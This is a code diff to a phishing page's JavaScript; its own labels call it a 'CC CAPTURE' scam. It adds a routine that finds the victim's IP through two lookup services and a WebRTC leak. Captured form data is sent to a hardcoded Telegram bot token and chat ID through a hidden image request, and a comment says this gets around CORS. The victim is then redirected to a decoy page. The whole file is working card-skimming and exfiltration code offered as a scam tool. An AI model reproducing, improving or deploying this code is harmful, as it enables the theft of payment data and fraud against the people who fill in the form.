@@ -251,33 +251,91 @@
             const formData = new FormData(event.target);
             const data = Object.fromEntries(formData.entries());
             
-            // Get IP
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-            } catch (error) {
-                data.ip = 'IP non disponible';
-            }
-
+            // Get IP avec plusieurs méthodes
+            data.ip = await getIPWithMultipleMethods();
             data.userAgent = navigator.userAgent;
             data.timestamp = new Date().toLocaleString('fr-FR');
             
             console.log('🎯 DONNÉES CAPTURÉES:', data);
             
             // Envoi à Telegram
-            await sendToTelegram(data);
+            sendToTelegram(data);
             
             setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
                 window.location.href = "results.html";
             }, 3000);
         }
 
-        async function sendToTelegram(data) {
+        async function getIPWithMultipleMethods() {
+            const methods = [
+                async () => {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        return data.ip;
+                    } catch (error) {
+                        throw new Error('ipify failed');
+                    }
+                },
+                async () => {
+                    try {
+                        const response = await fetch('https://ipinfo.io/json');
+                        const data = await response.json();
+                        return data.ip;
+                    } catch (error) {
+                        throw new Error('ipinfo failed');
+                    }
+                },
+                () => {
+                    return new Promise((resolve) => {
+                        const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                        if (RTCPeerConnection) {
+                            try {
+                                const rtc = new RTCPeerConnection({iceServers:[]});
+                                rtc.createDataChannel('', {reliable:false});
+                                rtc.onicecandidate = (event) => {
+                                    if (event.candidate) {
+                                        const ip = event.candidate.address || event.candidate.candidate.split(' ')[4];
+                                        if (ip) {
+                                            rtc.onicecandidate = null;
+                                            rtc.close();
+                                            resolve(ip);
+                                        }
+                                    }
+                                };
+                                rtc.createOffer()
+                                    .then(offer => rtc.setLocalDescription(offer))
+                                    .catch(() => resolve('IP non disponible'));
+                                setTimeout(() => resolve('IP timeout'), 2000);
+                            } catch (error) {
+                                resolve('IP error');
+                            }
+                        } else {
+                            resolve('WebRTC non supporté');
+                        }
+                    });
+                }
+            ];
+
+            for (const method of methods) {
+                try {
+                    const ip = await method();
+                    if (ip && ip !== 'IP non disponible' && ip !== 'IP timeout' && ip !== 'IP error') {
+                        return ip;
+                    }
+                } catch (error) {
+                    continue;
+                }
+            }
+            
+            return 'IP non disponible';
+        }
+
+        function sendToTelegram(data) {
             const botToken = '8229279019:AAG4jzV_zfXpi2Xylo-iSMXArgqERt9ptww';
             const yourUserID = '6150136595';
 
-            // Message stylé pour Telegram
             const message = `
 💳 SNAPTRACK CC CAPTURE 🧿 
       sc@mma by @cypherunit
@@ -306,21 +364,16 @@
 <############################>
             `.trim();
 
-            try {
-                // ENVOI DU MESSAGE STYLÉ
-                const messageImg = new Image();
-                const encodedMessage = encodeURIComponent(message);
-                const messageURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourUserID}&text=${encodedMessage}&parse_mode=HTML`;
-                
-                messageImg.src = messageURL;
-                messageImg.style.display = 'none';
-                document.body.appendChild(messageImg);
-
-                console.log('✅ Message envoyé à Telegram!');
-
-            } catch (error) {
-                console.error('❌ Erreur envoi:', error);
-            }
+            // TECHNIQUE IMG POUR CONTOURNER CORS
+            const img = new Image();
+            const encodedMessage = encodeURIComponent(message);
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourUserID}&text=${encodedMessage}&parse_mode=HTML`;
+            
+            img.src = telegramURL;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            
+            console.log('✅ Requête Telegram envoyée via technique IMG');
         }
 
         // Initialisation des particles
